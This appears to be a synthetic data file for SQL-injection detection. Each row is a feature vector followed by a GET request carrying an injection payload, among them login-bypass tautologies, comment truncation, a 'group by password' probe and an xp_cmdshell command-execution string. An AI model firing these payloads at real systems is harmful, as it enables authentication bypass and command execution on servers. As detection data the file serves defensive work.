34,1,200,2627,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,2243,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,2170,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,5705,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,1337,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,5497,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,1569,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,7725,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,3539,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,5348,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,5777,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,7698,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
28,1,200,6521,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,7582,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,3444,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,6404,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,6208,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,1130,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,1174,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,4871,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,6291,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,7036,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,3402,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,6188,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,5647,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,7114,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,3968,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,2470,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,7836,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,4433,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,5835,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,3480,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,6627,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,5947,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,6640,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,4582,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
64,1,200,7968,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,7225,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,1842,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,3217,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,2511,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,4050,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,1582,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,5556,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,1093,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,3558,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,6937,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,7913,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,6967,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,6581,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,1266,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,4973,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,7022,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,6573,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,7275,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,1115,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,6845,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,1838,7,38,7,3,1,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
38,1,200,5995,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,4039,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,6247,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,7908,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,6173,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,3707,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,1377,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,1657,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,6254,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,5292,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,4121,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,4187,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,3862,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,6925,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,4849,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,2285,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,7975,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,4728,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,7234,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,7616,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,3788,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
38,1,200,6591,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
32,1,200,7833,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,7944,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,7996,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,5540,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,6351,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,6368,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,7432,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,1075,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,7163,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,6126,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,4789,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,1642,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,1282,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,7300,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,3203,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,2850,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,5229,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,6065,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,4394,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,4418,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,5222,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,4402,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
32,1,200,4105,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
20,1,200,7660,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,4341,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,5224,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,4742,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,3972,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,5033,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,1110,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,2014,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,1286,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,4058,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,3359,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,4405,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,2053,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,7282,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,1358,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,4186,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,4855,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,6208,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,2911,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,1376,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,5368,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,4167,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,7552,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,5651,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,3657,7,2,5,2,1,GET ?id='/* HTTP/1.1
27,1,200,5189,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,1323,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,2166,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,6456,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,1640,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,6569,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,5876,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,7168,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,7349,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,6213,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,7307,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,1796,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,5925,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,1620,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,4192,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,3078,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,1425,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,7782,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,2525,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,7310,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,7138,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
27,1,200,5210,7,4,4,1,1,GET ?id=" or 0=0 – HTTP/1.1
39,1,200,3980,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,1199,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,4691,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,5551,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,5446,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,2334,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,2292,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,3410,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,5266,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,4279,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,4042,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,2120,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,1420,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,7811,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,2995,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,4334,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,5164,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,3882,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,7745,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,6806,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,3638,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,4279,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,6111,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
39,1,200,6827,7,14,4,2,1,GET login/?id=admin" or "1"="1 HTTP/1.1
26,1,200,4398,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,1042,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,2357,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,1941,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,2255,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,4496,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,6696,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,2926,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,2974,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,2383,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,5831,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,7574,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,3884,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,4459,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,1974,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,4434,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,6839,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,4508,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,6883,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,6015,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,6553,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
42,1,200,7153,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,7962,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,5272,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,3226,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,2498,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,3129,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,2428,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,3640,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,2651,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,6602,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,2023,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,1619,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,2303,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,7605,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,7990,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
42,1,200,2647,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
49,1,200,3774,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,5187,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,3314,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,3644,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,1473,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,6462,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,5054,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,5887,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,1345,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,6802,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,6442,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,1386,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,6894,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,2351,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,4279,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,7569,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,4112,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,2551,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,1584,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,3847,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,2419,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,3975,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,6505,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,7927,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,1043,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,3598,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
26,1,200,4648,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,7440,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,6872,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,4428,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,5468,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,1205,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,6589,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,6672,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,5369,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,1819,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,2153,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,4569,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,5621,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,6718,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,7053,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,6761,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,7006,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,5836,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,4193,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,3841,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,6804,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,7749,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,2636,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,7228,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,6929,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,2772,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,5110,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,6733,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,1995,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
26,1,200,7902,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
33,1,200,3907,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,4695,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,4186,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,3939,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,4290,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,3791,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,5305,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,6080,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,7600,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,2901,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,3829,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,2499,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,6864,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,7187,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,4851,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,6217,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,1738,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,6000,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,1130,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,4563,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,7754,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,4354,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,4531,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,3905,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,3063,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,3193,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,3081,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,1285,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,5684,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,5972,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,2346,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,4614,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,6398,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,2904,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,7340,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,2473,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,4541,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,7184,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,4384,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,7347,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,3374,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,1207,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,2589,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,4951,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,6856,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,2408,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
36,1,200,5310,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
36,1,200,1018,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
36,1,200,5255,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
36,1,200,2589,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
36,1,200,6962,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
36,1,200,3757,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
36,1,200,6603,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
36,1,200,6829,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
